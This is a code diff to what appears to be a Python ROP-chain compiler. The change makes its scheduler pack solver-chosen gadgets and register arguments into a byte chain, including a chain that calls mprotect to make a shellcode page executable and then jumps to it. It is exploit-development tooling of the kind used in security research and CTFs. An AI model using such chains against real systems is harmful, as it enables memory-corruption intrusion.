@@ -1,3 +1,4 @@
+import struct
 import goal as go, gadget as ga
 import z3helper
 
@@ -5,7 +6,6 @@ PAGE_MASK = 0xfffffffffffff000
 PROT_RWX = 7
 
 class Scheduler(object):
-
   func_calling_convention = [ "rdi", "rsi", "rdx", "rcx", "r8", "r9" ]
   #syscall_calling_convention = [ "rdi", "rsi", "rdx", "r10", "r8", "r9" ]  # TODO cover the syscall case
 
@@ -14,7 +14,10 @@ class Scheduler(object):
     self.solver = z3helper.Z3Helper()
     self.goals = goals
     self.find_needed_gadgets()
-    self.chain_gadgets()
+    self.chain = self.chain_gadgets()
+
+  def get_chain(self):
+    return self.chain
 
   def find_load_stack_gadget(self, register_name):
     for gadget in self.gadgets:
@@ -45,19 +48,32 @@ class Scheduler(object):
     for (name, gadget) in self.blocks.items():
       print name, gadget
 
-  def create_function_chain(self, goal, next_address = "XXXX"):
-    for i in range(len(goal.arguments)):
+  def create_function_chain(self, goal, next_address = 0x44444444):
+    chain = ""
+    prev_gadget = goal.address
+    for i in range(len(goal.arguments)-1, -1, -1):
       arg = goal.arguments[i]
-      gadget = self.blocks[self.func_calling_convention[i]]
+      reg = self.func_calling_convention[i]
+      gadget = self.blocks[reg]
       print "Setting arg %d to %x" % (i, arg)
       print gadget
-      print self.solver.get_values(gadget.to_statements())
-      print ""
-      # TODO Transform choosen gadget into rop chain
+      differences = self.solver.get_values(gadget.to_statements())
+
+      arg_chain  = differences[reg + "_output"][1] * "A"
+      arg_chain += struct.pack("Q", arg)
+      arg_chain += (differences["rip_output"][1] - len(arg_chain)) * "B"
+      arg_chain += struct.pack("Q", prev_gadget)
+      arg_chain += (differences["rsp_output"][1] - len(arg_chain)) * "C"
+      chain = arg_chain + chain
+
+      prev_gadget = gadget.address
+
+    chain = struct.pack("Q", prev_gadget) + chain + struct.pack("Q", next_address)
+    return chain
 
   def create_shellcode_address_chain(self, goal):
     mprotect_goal = go.FunctionGoal("mprotect", goal.mprotect_address, [goal.shellcode_address & PAGE_MASK, 0x10000, PROT_RWX])
-    mprotect_chain = self.create_function_chain(mprotect_goal)
+    mprotect_chain = self.create_function_chain(mprotect_goal, goal.shellcode_address)
     return mprotect_chain
 
   def chain_gadgets(self):
@@ -70,6 +86,9 @@ class Scheduler(object):
       elif type(goal) == go.ShellcodeGoal:
         pass # TODO implement putting the shellcode into memory
 
+      chain += goal_chain
+
+    return chain
     # TODO chain to gather the blocks into function calls and goals
 
 
